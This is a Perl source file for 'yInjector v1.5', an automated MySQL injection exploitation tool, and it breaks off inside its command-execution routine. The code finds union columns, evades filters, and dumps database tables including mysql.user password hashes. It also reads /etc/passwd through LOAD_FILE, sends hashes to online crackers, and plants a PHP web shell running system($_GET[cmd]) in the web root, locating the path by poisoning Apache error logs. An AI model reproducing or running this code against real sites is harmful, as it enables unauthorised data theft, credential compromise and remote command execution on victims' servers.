#!/usr/bin/perl

# Name    :  yInjector
# Release :  v 1.5
# Author  :  "Osirys", Giovanni Buzzin
# Contact :  osirys [at] autistici [dot] org / me [at] y-osirys [dot] com
# Web     :  y-osirys.com
# Date    :  26/06/2011

# GNU GPL LICENCE:
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public
# License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any
# the Free Software Foundation; either version 2 of the License, or later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the Free
# Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

# Description:

# This software is a complete tool for MySQL Injection exploiting. It just uses sockets, so you will not need any
# modules installed in your box. Features:

# HTTP Proxy Support
# Log File Support
# GET/COOKIE/POST Request
# Column number finding
# Column printed finding
# Database Dumping
# Dumping from any database you have access to

# Fix and updates for v 1.5 release

# a. Session (with COOKIE) support, to enable POST auth and with "Sessions only" Exploitation
# b. Various test added to check if rows are printed correctly (for a match reason) in order
#    to avoid unknown errors in data retrieving. Usually there are many columns that print
#    rows on screen, and is possible that there's a lenght limit and because of this rows
#    are only partially printed, and in this case delimiters like {owned} might be not printed,
#    causing match errors and partial or none information retrieving.
#    + The test tries to see if a 121 chars string is printed correctly between {owned} tags
#      in case the tested column doesn not pass this test, in addition of more columns, the
#      test will be repeated untill yInjector will find a valid and good column to be used for
#      data fingeprint process.
# c. Multi options and unexpected behaviour/conditions handling:
#    + In case mysql version was impossible to retrieve, yInjector now does more tests to see if
#      information_schema is supported.
#    + In case current db was impossible to retrieve, yInjector now does more tests to see if is
#      possible to get anyway at least one DB name. * this is very important since to dump data
#      columns and tables name have to be known, and to get them is eccential information_schema,
#      and in case user has no priviledges to access all DB, at least the current DB has to be known.
#  . Other small bugs are fixed


# Code begins here

use IO::Socket::INET;
use Text::ParseWords;

$| = 1;

my @dbs;
my $info_schema_other_dbs;
my $port_;
$start_kind  = $ARGV[0];
$start_kind_ = $ARGV[1];
$treq        = $ARGV[2];
$treq_       = $ARGV[3];
$ahttpr_     = $ARGV[4];
$ahttprv_    = $ARGV[5];
$log_opt     = $ARGV[6];
$log_opt_    = $ARGV[7];

$first = 1;

print "\n".
      "-------------------------------------\n".
      "           yInjector v 1.5\n".
	 "      HackLabs - Giovanni Buzzin\n".
      "          www.hacklabs.com\n".
      "-------------------------------------\n\n";

if ((!$start_kind)||(!$treq)||(!$start_kind_)||(!$treq_)||(!$ahttpr_)||(!$log_opt)||(!$log_opt_)||($start_kind_ !~ /[1-3]/)||($treq_ !~ /[1-2]/)||($ahttprv_ !~ /y|n/)) {
     yprint("[-] Bad arguments !\n\n".
           "    Usage: $0 -a 1|2|3 -b 1|2\n".
           "    -a 1      -> Finds columns number only\n".
           "    -a 2      -> Dumps with the completed SQL String\n".
           "    -a 3      -> Finds columns and then dumps (FULL Automated Exploitation)\n".
           "\n".
           "    -b 1      -> GET  Request\n".
           "    -b 2      -> POST Request\n\n".
           "    -c y/n    -> Customized HTTP requests (UA, Cookie/Session, etc.) support\n".
           "    -l n      -> No Log support\n".
           "    -l <path> -> Log File support\n\n",2);
     exit(0);
}
else {
	if ($log_opt_ !~ /n/) {
		if (!open FILE, '>', $log_opt_) {
			yprint("[-] Can't open $log_opt_ : $!\n\n",2);
			exit(0);
		}
		else {
			$file_st = 1;
		}
	}
     yprint("[+] yInjector Exploiter Started !\n\n",2);
}

if ($start_kind_ == 1) {
     &sql_exploit_1;
}
elsif ($start_kind_ == 2) {
     &sql_exploit_2;
}
elsif ($start_kind_ == 3) {
     &sql_exploit_1;
     &sql_exploit_2;
}

if ($file_st == 1) {
	close($file);
}

sub sql_exploit_1() {
     my $pk;

     yprint("[+] Columns and SQL Injection Generation Step :\n",2);
     if ($treq_ == 1) {
          yprint("[+] Type now the website, place :INJ: after the var\n".
                "    () -> http://host/page.php?id=2 :INJ:&var=2\n".
                "    () -> http://host/cms/page.php?id=2 :INJ:%23&var=2\n".
                "     Place :INJ: near your bugged variable\n".
                "     After :INJ: you can put the end of your SQL code (--|\%23|#)\n".
                "\n[*] Site: ",2);

          chomp($site = <STDIN>);
          $site =~ /:INJ:(.*)/ || die "\n[-] Missing :INJ:\n\n";
          $een = $1;
          get_input($site,1);
          $pk = $path;
     }
     elsif ($treq_ == 2) {
          yprint("[+] Type now the website with the full path of the vulnerable page\n".
                "    (Ex: http://host/cms/vuln_page.php)\n".
                "\n[*] Site: ",2);
          chomp($site = <STDIN>);

          yprint("[+] Type now the POST request with the SQL code\n".
                "    () -> key=day&id=1 :INJ:&var=2\n".
                "    () -> key=day&id=1' :INJ:#&var=2\n".
                "     Place :INJ: near your vulnerable variable\n".
                "     After :STOP: you can put the end of your SQL code (--|\%23|#)\n".
                "\n[*] POST Request: ",2);
          chomp($pcontent = <STDIN>);
          $pcontent =~ /:INJ:(.*)/ || die "\n[-] Missing :INJ:\n\n";
          $een = $1;
          get_input($site,2);
          $pk = $pcontent;
     }




     config($pk,1);

     yprint("[!] yInjector v 1.5\n",1);
     yprint("[!] Coded by Giovanni Buzzin, \"Osirys\"\n",1);
     yprint("[!] osirys[at]autistici[dot]org\n",1);
     yprint("\n[+] Column Number finder Step Started !\n",1);
     yprint("[+] Host: $h0st\n\n",1);

     yprint("\n[+] Type now the condition (TRUE/FALSE) to match with a static response\n".
           "    1 [True Condition  (1=1)]\n".
           "    2 [False Condition (1=2)]\n".
           "[*] Condition: ",2);
     chomp($matchk = <STDIN>);
     $matchk =~ /[1-2]/ || die "\n[-] Bad Match Kind !\n\n";

     yprint("\n[+] Type now static response to match the columns number\n".
           "[*] Response: ",2);
     chomp($match = <STDIN>);
     $match =~ /.+/ || die "\n[-] Bad Match response !\n\n";
	$match =~ s/\\/\\\\/g;
	$match =~ s/\./\\./g;
	$match =~ s/\(/\\(/g;
	$match =~ s/\)/\\)/g;
	$match =~ s/\[/\\[/g;
	$match =~ s/\?/\\?/g;
	$match =~ s/\]/\\]/g;
	$match =~ s/\{/\\{/g;
	$match =~ s/\}/\\}/g;
	$match =~ s/\*/\\*/g;
	$match =~ s/\+/\\+/g;
	$match =~ s/\$/\$/g;
	$match =~ s/\^/\\^/g;
	$match =~ s/\//\\\//g;
     yprint("\n[+] Filters Bypass (y|n):\n".
           "[*] Bypass: ",2);
     chomp($bypass = <STDIN>);

     yprint("\n[+] Type now max number of columns to test on :\n".
           "[*] Num: ",2);
     chomp($max = <STDIN>);
     $max =~ /[0-9]+/ || die "\n[-] Missin max columns number to test on !\n\n";

     yprint("\n[+] HTTP Proxy (n|<ip:port>)\n".
           "[*] Proxy: ",2);
     chomp($proxy = <STDIN>);

	if ($proxy !~ /n|/) {
		if ($proxy =~ /([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3}):(.+)/) {
			$proxya = $1.".".$2.".".$3.".".$4;
			$proxyp = $2;
		}
		else {
			$bpro = 1;
			$proxy = 0;
		}
	}
	else {
		$proxy = 0;
	}
	$bpro != 1 || die "\n[-] Bad proxy <ip:port>\n\n";

     my $num = 1;
     my $c_string = "";
	@tmp_vars_col_tests;
     while (($num <= $max)&&($resp != 1)) {
          if ($num == 1) {
               push(@columns,1);
               $pcontent_ = $pk;
               if ($bypass == 1) {
                    $string = "uNiOn/**/sElEcT/**/".$num;
                    $pcontent_ =~ s/\s*:INJ:/\/**\/$string/;
               }
               else {
                    $string = "union select ".$num;
                    $pcontent_ =~ s/:INJ:/$string/;
               }
               print "\n";
               $resp = column_match($pcontent_,1);
          }
          else {
               my $string_;
               push(@columns,$num);
               foreach my $n(@columns) {
                    $string_ .= $n.",";
               }
               $string_ =~ s/,$//;
               $pcontent_ = $pk;
               if ($bypass == 1) {
                    $string = "uNiOn/**/sElEcT/**/".$string_.$esc;
                    $pcontent_ =~ s/\s*:INJ:/\/**\/$string/;
               }
               else {
                    $string = "union select ".$string_.$esc;
                    $pcontent_ =~ s/:INJ:/$string/;
               }
               $resp = column_match($pcontent_,$num);
          }
          $num++;
     }

     if ($resp != 1) {
          yprint("\n[-] Unable to find the right number of columns !\n\n");
          exit(0);
     }
}

sub sql_exploit_2() {
     sleep(2) if ($start_kind_ == 3);
     if ($treq_ == 1) {
          if ($start_kind_ != 3) {
               yprint("[+] Dumping Step :\n".
                     "[+] Type now the union SQL Injection ->\n".
                     "    (Ex1: http://site.it/page.php?id=2 and 1=2 union select 1,:print:,2,3:STOP:&var=2)\n".
                     "    (Ex2: http://site.it/cms/page.php?id=-2' union select 1,:print:,2,3:STOP:\%23&var=2)\n".
                     "     Place :print: instead of the column that prints rows. ! Insert just one :print:\n".
                     "     Place :STOP: at the end of the select of you Injection\n".
                     "     After :STOP: you can put the end of you Inj (--|\%23|#)\n".
                     "\n[*] Site: ",2);
               chomp($site = <STDIN>);
               $site =~ /:print:/ || die "\n[-] Missing :print: in SQL Inj\n\n";
               $site =~ /:STOP:/ || die "\n[-] Missing :STOP: at the end of SQL Inj\n\n";
               get_input($site,1);
               $pkkk = $path;
          }
     }
     elsif ($treq_ == 2) {
          if ($start_kind_ != 3) {
               yprint("[+] Dumping Step :\n".
                     "[+] Type now the hostname of your site with the full path of the script ->\n".
                     "    (Ex: http://www.site.it/cms/vuln_page.php)\n".
                     "\n[*] Site: ",2);
               chomp($site = <STDIN>);
               yprint("[+] Type now the content of your request within the SQL Inj->\n".
                     "    (Ex1: ordine=giorno&corso_laurea=1 and 1=2 union select 1,:print:,2:STOP:&var=2)\n".
                     "    (Ex2: ordine=giorno&corso_laurea=-1' union select 1,:print:,2:STOP:#&var=2)\n".
                     "     Place :print: instead of the column that prints rows. ! Insert just one :print:\n".
                     "     Place :STOP: at the end of the SQL Injection\n".
                     "     After :STOP: you can put the end of you Inj (--|\%23|#)\n".
                     "\n[*] Content: ",2);
               chomp($pcontent = <STDIN>);
               $pcontent =~ /:print:/ || die "\n[-] Missing :print: in SQL Inj\n\n";
               $pcontent =~ /:STOP:/ || die "\n[-] Missing :STOP: at the end of SQL Inj\n\n";
               get_input($site,2);
               $pkkk = $pcontent;
          }
     }

     if (($start_kind_ != 3)&&($proxy == 0)) {
          yprint("[+] HTTP Proxy (n|<ip:port>)\n".
                "[*]  Proxy: ",2);
          chomp($proxy = <STDIN>);
		if ($proxy !~ /n|/) {
			if ($proxy =~ /([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3}):(.+)/) {
				$proxya = $1.".".$2.".".$3.".".$4;
				$proxyp = $2;
			}
			else {
				$bpro = 1;
				$proxy = 0;
			}
		}
		else {
			$proxy = 0;
		}
		$bpro != 1 || die "\n[-] Bad proxy <ip:port>\n\n";
     }

     if ($start_kind_ == 3) {
          config($site);
     }
     else {
          config($pkkk,1);
     }

     if ($start_kind_ == 2) {
          yprint("[!] yInjector v 1.5\n",1);
          yprint("[!] Coded by Giovanni Buzzin, \"Osirys\"\n",1);
          yprint("[!] Visit : y-osirys.com\n\n",1);
          yprint("\n[+] Extracting datas from: $h0st\n");
     }
     if ($proxy != 0) {
          yprint("[!] Using $proxya:$proxyp as proxy ..\n");
     }
	sleep(1);
     yprint("[!] General information :\n");
     @gen_data = qw(version\(\) database\(\) user\(\));
     my $count = 0;
	$db_name = 1;
	$info_schema_no_msyqlver_check_test = 0;
     foreach my $e(@gen_data) {
          my $info;
          $count++;
          my $inj = &get_sql_inj($e,0,0,0);#print "inj: $inj\n";
          my $re = req($inj,"\{ownedE\}");#print $re;exit;
          if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
               $info = $1;
          }
          if ($info !~ /.{2,50}/) {
               $info =~ s/.*/n.a/;
          }
		if (($info =~ /n\.a/)&&($count == 1)) {
	          my $inj = &get_sql_inj("\@\@version",0,0,0);
			my $re = req($inj,"\{ownedE\}");
			if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
				$info = $1;
			}
		}

          if ($count == 1) {
               yprint("    [VERSION] : $info\n");
               $mysql_version = $info;
          }
          elsif ($count == 2) {
               yprint("    [DATABASE]: $info\n");
               $database_name = $info;
          }
          elsif ($count == 3) {
               yprint("    [USER]    : $info\n");
               $mysql_user = $info;
          }
     }
	sleep(1);
     yprint("\n[+] Mysql.User Access status : \n");
     my $inj = &get_sql_inj("Host,0x3a,User,0x3a,Password", "mysql.user", 0, 1);#print "inj: $inj\n";
	my $rows = count_rows("mysql.user", 0);
     my $bb = &own("sql_compl",$inj,0,$rows);
     if ($bb != 1) {
          yprint("Access to mysql.user Table : Disabled\n");
     }
	sleep(1);
     yprint("\n[+] LOAD_FILE Test started ! \n");

	# /boot.ini
	# /etc/passwd 0x2f6574632f706173737764
	# C:\\boot.ini
	# D:\\boot.ini
	# E:\\boot.ini
	# Z:\\boot.ini
	# c://boot.ini
	# C:/WINDOWS/win.ini 0x433a2f57494e444f57532f77696e2e696e69
	# C:\\WINDOWS\\win.ini 0x433a5c5c57494e444f57535c5c77696e2e696e69

	@load_file_files = qw(0x2f6574632f706173737764 0x433a2f57494e444f57532f77696e2e696e69 0x433a5c5c57494e444f57535c5c77696e2e696e69);
	my $load_count = 0;
	my $OS;
	$load_file_stat = 0;
	while ((my $f = <@load_file_files>)&&($load_file_stat != 1)) {
		yprint("    Trying to load ".$f."\n");
		my $inj = &get_sql_inj("load_file(".$f.")", 0, 0, 0);
		my $re = req($inj,"\{ownedE\}");
		if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
			my $con = $1;
			$load_file_stat = 1;
			yprint("Status : Enabled\n\n");
			if ($load_count == 0) {
				$OS = "Linux system";
				yprint("    Loaded file: /etc/passwd\n$con\n");
			}
			else {
				$OS = "Windows system";
				yprint("    Loaded file: \n$con\n");
			}
		}
		$load_count++;
	}
	if ($load_file_stat == 0) {
          yprint("    Status : Disabled\n\n");
     }
	else {
		yprint("[+] OS detected: ".$OS."\n");
	}
	sleep(1);
     yprint("[+] Magic Quotes Status: ");
     my $inj = &get_sql_inj("'mqOff'", 0, 0, 0);
     my $re = req($inj,"\{ownedE\}");
     if ($re =~ /\{owned\}mqOff\{ownedE\}/i) {
		$mq_stat = 1;
          yprint("Off\n\n");
     }
     else {
		$mq_stat = 0;
          yprint("On\n\n");
     }
	sleep(1);
     if ($mysql_version =~ /5\./) {
          $info_schema = 1;
          yprint("[+] Current MySQL version ($mysql_version) supports information_schema Table\n");
     }
     else {
		if ($mysql_version !~ /n\.a/) {
			$info_schema = 0;
			yprint("[-] Current MySQL version ($mysql_version) does not support information_schema Table\n");
		}
		else {
			yprint("[-] Unable to retrieve mysql version, yInjector will load a test to cheeck if\n".
				  "    information_schema table is supported !\n");
			$info_schema_no_msyqlver_check_test = info_schema_nomysqlver_test();
			if ($info_schema_no_msyqlver_check_test == 1) {
				$info_schema = 1;
			}
			else {
				$info_schema = 0;
			}
		}
     }
	if ($info_schema == 1) {
          my $inj = &get_sql_inj("schema_name", "information_schema.schemata", 0, 0);
          my $re = req($inj,"\{ownedE\}");
          if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
               yprint("[+] $mysql_user has access to :\n");
               $table_c = hex_conv("information_schema.schemata");
               my $rows = count_rows("information_schema.schemata", 0);
               my $inj = &get_sql_inj("schema_name", "information_schema.schemata", 0, 1);
               my $bb = &own("sql_compl",$inj,0,$rows,1);
               $bb == 1 || yprint("[-] Unknown error\n");
			if ($bb == 1) {
				$info_schema_other_dbs = 1;
			}
          }
          else {
               yprint("[-] $mysql_user has not access to other databases\n");
          }
	}
	if ($database_name =~ /n\.a/) {
		$db_name = 0;
		if ($info_schema == 0) {
			yprint("[-] information_schema DB is not supported, in addition yInjector was unable to retrieve\n".
				  "    the current DB name. Since we don't know tables and columns names, dumping process\n".
				  "    can't be succesfull and so will stop now. Bad luck !\n\n");
			$exit = 1;
		}
		elsif (($info_schema == 1)&&($info_schema_other_dbs == 0)) {
			yprint("[-] Unable to retrieve the current db name.\n".
				  "    in addition, current user has no prividges to access information_schema.schemata table.\n".
				  "    yInjector will try to get DBs name from information_schema.tables..\n");
	
			# select distinct TABLE_SCHEMA from information_schema.tables
			my $rows = count_rows("information_schema.table", 0, "TABLE_SCHEMA");
               my $inj = &get_sql_inj("distinct TABLE_SCHEMA", "information_schema.tables", 0, 1);
               my $bb = &own("sql_compl",$inj,0,$rows,2);
               $bb == 1 || yprint("[-] Unknown error\n");
			if ($bb == 1) {
				if (scalar(@dbs_2) > 1) {
					my $c = 0;
					foreach my $e(@dbs_2) {
						$c++;
						yprint("    $c - $e\n");
					}
				}
			}
			else {
				yprint("[-] Information schema DB is supported, but yInjector was unable to get neither one DB name\n".
					  "    Since to dump succesfully we need to know columns and tables name, and for this we need\n".
					  "    to know at least the current DB used, yInjector will stop. Bad luck !\n\n");
				$exit = 1;
			}
		}
	}

	if ($exit == 1) {
		print "\n[-] Quitting ..\n\n";
		exit(0);
	}

	print "\n";
     &main;
}



sub main {
     my($choose,$table,$table_c,$string,$columns_e,$table_e);
     yprint("[!] Mysql Command Line spawned on : $h0st\n".
           "    Type help for a list of command.\n",2);
     while (1) {
          yprint("\n$mysql_user : ",2);
          chomp($choose = <STDIN>);
          if ($choose =~ /[1-7]|help|h|e|l/) {
               if (($choose =~ /^l$/)&&($info_schema_other_dbs == 1)) {
                    my $c = 0;
                    yprint("[+] Getting list of databases which $mysql_user has access to: \n");
                    foreach my $e(@dbs) {
                         $c++;
                         yprint("    $c - $e\n");
                    }
               }
               elsif ($choose =~ /[1-4]{1}/) {
                    my($ok,$rows,$inj,$table,$table_c,$columns,$db,$db_c) = (0,undef,undef,undef,undef,undef,undef,undef);
                    if ($info_schema_other_dbs == 1) {
                         if ($choose == 1) {
                              yprint("[+] Dumping all Tables from DB: ");
                         }
                         elsif ($choose == 2) {
                              yprint("\n[+] Dumping all Columns from DB: ");
                         }
                         elsif ($choose == 3) {
                              yprint("\n[+] Dumping all Columns from database.table\n");
                              yprint("[+] Table: ");
                              chomp($table = <STDIN>);
                              yprint("$table\n",1);
                              $table_c = hex_conv($table);
                              yprint("[+] Database: ");
                         }
                         elsif ($choose == 4) {
                              yprint("\n[+] Dumping user selected columns from database.table\n".
                                       "[+] Columns (separeted with a space): ");
                              chomp($columns = <STDIN>);
						yprint("$columns\n",1);
						$columns =~ s/ /,0x3a,/g;
                              yprint("[+] from Table: ",2);
                              chomp($table = <STDIN>);
						yprint("$table\n",1);
                              yprint("[+] from DB: ",2);
                         }

                         chomp($db = <STDIN>);
					yprint("$db\n",1);
                         $db_c = hex_conv($db);
                         $found = in_array($db,@dbs);
                         if ($found != 1) {
                              yprint("[-] $db not in databases list !\n");
                         }
                         elsif (($choose == 3)&&($table !~ /(.+)/)) {
                              yprint("[-] Bad table syntax\n");
                         }
                         elsif (($choose == 4)&&(($table !~ /(.+)/)&&($columns !~ /(.+)/))) {
                              yprint("[-] Bad table and column syntax\n");
                         }
                         else {
                              $ok = 1;
                              if ($choose == 1) {
                                   $rows = count_rows("information_schema.tables", "table_schema=".$db_c);
							($a,$b,$c,$d) = ("table_name", "information_schema.tables", "table_schema=".$db_c, 1);
                              }
                              elsif ($choose == 2) {
                                   $rows = count_rows("information_schema.columns", "table_schema=".$db_c);#
							($a,$b,$c,$d) = ("column_name", "information_schema.columns", "table_schema=".$db_c, 1);
                              }
                              elsif ($choose == 3) {
                                   $rows = count_rows("information_schema.columns", "table_name=".$table_c." and table_schema=".$db_c);#
							($a,$b,$c,$d) = ("column_name", "information_schema.columns", "table_name=".$table_c." AND table_schema=".$db_c, 1);
                              }
                              elsif ($choose == 4) {
                                   $rows = count_rows($db.".".$table, 0);# ???????
							($a,$b,$c,$d) = ($columns, $db.".".$table, 0, 1);
                              }
                         }
                    }
                    else {
                         $ok = 1;
					$db_c = hex_conv($database_name);

                         if ($choose == 1) {
						# select table_name from information_schema.tables where table_schema=<hex(db)>
                              yprint("\n[+] Dumping all Tables from DB: $database_name !\n");
                              $rows = count_rows("information_schema.tables", 0);#
						($a,$b,$c,$d) = ("table_name", "information_schema.tables", "table_schema=".$db_c, 1);
                         }
                         elsif ($choose == 2) {
						# select column_name from information_schema.columns where table_schema=<hex(db)>
                              yprint("\n[+] Dumping all Columns from DB: $database_name :\n");
                              $rows = count_rows("information_schema.columns", 0);
						($a,$b,$c,$d) = ("column_name", "information_schema.columns", "table_schema=".$db_c, 1);
                         }
                         elsif ($choose == 3) {
						# select column_name from information_schema.columns where table_name=<hex(table)> and table_schema=<hex(db)>
                              yprint("\n[+] Dumping Columns from table: ");
                              chomp($table = <STDIN>);
                              yprint("$table\n",1);
                              $table_c = hex_conv($table);
                              $rows = count_rows("information_schema.columns", "table_name=$table_c");
						($a,$b,$c,$d) = ("column_name", "information_schema.columns", "table_name=".$table_c." AND table_schema=".$db_c, 1);
                         }
                         elsif ($choose == 4) {
						# select <columns> from table
                              print "\n[+] Dumping user selected columns from $database_name.table\n";
                              print "[+] Columns (separeted with a space): ";
                              chomp($columns = <STDIN>);
                              print "[+] from Table: ";
                              chomp($table = <STDIN>);
                              if (($table =~ /(.+)/)&&($columns =~ /(.+)/)) {
                                   yprint("\n[*] [Dumping] --> Columns[$columns] from Table[$table]\n");
                                   $rows = count_rows($table, 0);
							$columns =~ s/ /,0x3a,/g;
							($a,$b,$c,$d) = ($columns, $table, 0, 1);
                              }
                              else {
                                   $ok == 0;
                                   yprint("[-] Bad table and column syntax\n");
                              }
                         }
                    }
                    if ($ok == 1) {
                         yprint("[?] Type now the extraction type:\n[+] 1 - Extracts with LIMIT (Lots of requests)\n".
                                 "[+] 2 - Extracts all in a single string with GROUP_CONCAT (Single request)\n[+] Extraction Type: ");
                         chomp(my $ext_t = <STDIN>);
                         if ($ext_t =~ /[1-2]/) {
						yprint($ext_t."\n",1);
                              if ($ext_t == 1) {
							my $inj = &get_sql_inj($a,$b,$c,$d);
							my  $bb = 0;
                                   $bb = &own("Data",$inj,0,$rows);
                                   $bb == 1 || yprint("[-] Can't extract data. Unknown error.\n");
                              }
                              elsif ($ext_t == 2) {
							if ($bypass == 1) {
								$a =~ s/(.+)/gRoUp_CoNcAt($1)/;
							}
							else {
								$a =~ s/(.+)/group_concat($1)/;
							}

							my $inj = &get_sql_inj($a, $b, $c, 0);
							my $re = req($inj,"\{ownedE\}");
							if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
								my $data = $1;
								my $count = 0;
								my @values = split(',', $data);
								foreach my $v(@values) {
									$count++;
									yprint("    [data][$count/$rows] : [$v]\n");
								}
							}
							else {
								yprint("[-] Can't extract data. Unknown error.\n");
							}
                              }
                         }
                         else {
                              yprint("[-] Bad extraction type\n");
                         }
                    }
               }
               elsif ($choose == 5) {
				yprint("\n[+] MD5 Hash Cracking\n".
					 "[+] Hash: ");
				chomp(my $hash = <STDIN>);
				yprint($hash."\n",1);
				if ($hash =~ /^[0-9a-f]{32}$/i) {
					@md5vars = (
						'netmd5crack.com'     => '/cgi-bin/Crack.py?InputHash='.$hash.'||>'.$hash.'<\/td><td class=\"border\">(.+)<\/td>||'.
											'get||www.netmd5crack.com||www.netmd5crack.com||',
						'md5crack.com'        => 'term='.$hash.'&crackbtn=Crack that hash baby !||Found: md5\(\"(.+)\"\) = '.$hash.'||'.
											'post||md5crack.com||www.md5crack.com||/crackmd5.php',
						'onlinehashcrack.com' => 'hashToSearch='.$hash.'&searchHash=Search||Plain text : <b style=\"letter-spacing:1\.2px\">'.
											'(.+)<\/b>||post||www.onlinehashcrack.com||www.onlinehashcrack.com||/free-hash-reverse.php'
					);

					for ($i = 0;$i<=4;$i++) {
						my $re;
						my $w = $md5vars[$i];
						my $var = $md5vars[++$i];
						$var =~ /([^|]+)\|\|([^|]+)\|\|([^|]+)\|\|([^|]+)\|\|([^|]+)\|\|(.*)/;
						my($link,$gexp,$opt) = ($1,$2,$3."||".$4."||".$5."||".$6);
						$re = req($link,$gexp,$opt);

						if ($re =~ /$gexp/) {
							my $cracked = $1;
							$found = 1;
							yprint("[+] $w reports : md5($cracked) = $hash\n");
						}
						else {
							yprint("[+] $w reports : md5(?) = $hash\n");
						}
					}
					if ($found != 1) {
						yprint("\n[-] Can't crack md5[$hash]\n\n");	
					}
				}
               }
               elsif ($choose == 6) {
				my $go_back_menu = 0;
                    yprint("\n[+] MySQL Command Line <Beta>\n\n[i] Version : $mysql_version\n".
                          "[i] DB Name : $database_name\n".
                          "[i] User    : $mysql_user\n[H] Type exit to go back in the main menu\n");
                    while ((1)&&($$go_back_menu != 1)) {
                         yprint("\n[+] SELECT : ",2);
                         chomp(my $select = <STDIN>);
					if ($select !~ /.+/) {
						yprint("[-] Bad SELECT syntax");
						$qerr = 1;
					}
                         yprint("\n[+] FROM   : ",2);
                         chomp(my $from = <STDIN>);
					if ($from !~ /.+/) {
						yprint("[-] Bad FROM syntax");
						$qerr = 1;
					}
                         yprint("\n[+] WHERE  : ",2);
                         chomp(my $where = <STDIN>);
					if ($where !~ /.+/) {
						$where = 0;
					}
                         yprint("\n[+] LIMIT  : ",2);
                         chomp(my $limit = <STDIN>);
					if ($limit !~ /.+/) {
						$limit = 0;
					}
					yprint("\n[+] Proceed ? Enter :\n".
						  "      1 -> go on\n".
						  "      2 -> start again MySQL command line\n".
						  "      3 -> go back to main menu\n".
						  "      Choice: ");
					chomp(my $ch = <STDIN>);
					if ($ch =~ /1|2|3/) {
						if (($ch != 2)&&($ch != 3)) {
							$inj = &get_sql_inj($select, $from, $where, $limit);
							my $re = req($inj,"\{ownedE\}");
							if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
								my $out = $1;
								yprint("\n[+] Output -> $out\n");
							}
							else {
								yprint("\n[-] Bad query, or something wrong !\n");
							}
						}
						else {
							if ($ch == 3) {
								$go_back_menu = 1;
							}
						}
					}
                    }
               }
			elsif ($choose == 7) {
				my $sum = 0;
				my($mq_ok,$ld_ok,$ld_step,$err) = 0;
                    yprint("\n[+] Command Execution\n".
					  "    In order to get a Command Execution on the server, is required :\n".
					  "    1 - Magic Quotes Off (Into Outfile uses '', there is no way to bypass it\n".
					  "    2 - Write Permission on the file system, in order to create a PHP Shell\n".
					  "    3 - Local Path of the website in the server, in order to create a PHP Shell\n".
					  "        To get the local Path there are two different ways :\n".
					  "            3a - (Self provided) User will provide the internal file system path\n".
					  "            4a - (Automated)     Apache Errors Log Poisoning (Needs Load File to be enabled)\n\n".
					  "    [+] Checking requirements ..\n");
				if ($mq_stat == 1) {
					$mq_ok = 1;
					yprint("    [+] OK -> Magic Quotes : Off\n");
				}
				else {
					$err = 1;
					yprint("    [-] FAIL -> Magic Quotes : Off\n\n".
						  "    [-] Command Execution requirements test Failed !\n\n");
				}
				if ($mq_ok == 1) {
					yprint("    [+] Local Path Step :\n".
						"        1      -> Automated Exploitation via Apache Errors Log (Needs Load File to be enabled)\n".
						"        <path> -> Type the Local Path (ex: /var/www/website/data/)\n".
						"    [+] Local Path : ");
					chomp(my $way = <STDIN>);
					if ($way == 1) {
						if ($load_file_stat == 1) {
							$ld_step = 1;
							$ld_ok = 1;
							yprint("    [+] OK -> Load File status : ON\n");
						}
						else {
							$err = 1;
							yprint("    [+] FAIL -> Load File status : Off\n\n".
								  "    [-] Command Execution requirements test Failed !\n\n");
						}
					}
					else {
						if ($way =~ /\/+/) {
							$ld_step = 0;
							$l_path = $way;
						}
						else {
							$err = 1;
							yprint("    [-] Bad Local Path !\n\n".
								  "    [-] Command Execution Failed ! (Bad path provided)\n\n");
						}
					}
				}
				if ($err != 1) {
					my $rand    = int(rand 9) +1;
					my @error_logs  =  qw(
										/var/log/httpd/error.log
										/var/log/httpd/error_log
										/var/log/apache/error.log
										/var/log/apache/error_log
										/var/log/apache2/error.log
										/var/log/apache2/error_log
										/logs/error.log
										/var/log/apache/error_log
										/var/log/apache/error.log
										/usr/local/apache/logs/error_log
										/etc/httpd/logs/error_log
										/etc/httpd/logs/error.log
										/var/www/logs/error_log
										/var/www/logs/error.log
										/usr/local/apache/logs/error.log
										/var/log/error_log
										/apache/logs/error.log
									);
					my $inj,$gotcha;
					my $php_c0de   =  "<?php echo \"st4rtI\";if(get_magic_quotes_gpc()){ \$_GET".
								   "[cmd]=stripslashes(\$_GET[cmd]);}system(\$_GET[cmd]);echo \"Fst4rt\" ?>";

					if ($ld_step == 0) {
						$inj = &get_sql_inj("'".$php_c0de."'",0,0,0,"into dumpfile '".$l_path."/1337.php'");
					}
					elsif ($ld_step == 1) {
						sleep(1);
						yprint("    [+] Automated Local Path retrieving step started !\n\n");
						yprint("        * Generating error through GET request\n");

						req("/yInjection000test".$rand);
						yprint("        * Cheeking Apache Error Log path ..\n");
						my $c = 0;
						sleep(1);
						while (($log = <@error_logs>)&&($gotcha != 1)) {
							my $hlog = hex_conv($log);
							yprint("        $hlog\n");
							my $inj = &get_sql_inj("load_file(".$hlog.")",0,0,0,1);
							my $re = req($inj,"");
							$c++;
							if ($re =~ /File does not exist: (.+)\/yInjection000test$rand/) {
								$l_path = $1."/";
								$gotcha = 1;
								sleep(1);
								yprint("\n        [!] Error Log path found -> $log\n");
								yprint("        [!] Website path found   -> $l_path\n\n");
							}
						}
						if ($gotcha != 1) {
							sleep(1);
							yprint("    [-] Unable to retrieve Local Path !\n".
								  "    [-] Command Execution Failed ! (Bad path provided)\n\n");
						}
						else {
							$inj = &get_sql_inj("'".$php_c0de."'",0,0,0,"into dumpfile '".$l_path."1337.php'");
						}
					}
					if (($ld_step == 0)||(($ld_step == 1)&&($gotcha == 1))) {
						my $sr;
						req($inj,"");
						my $p = $pack_st;
						$p =~ s/(.+)([\/]+)([^\/]+)/$1$2/;
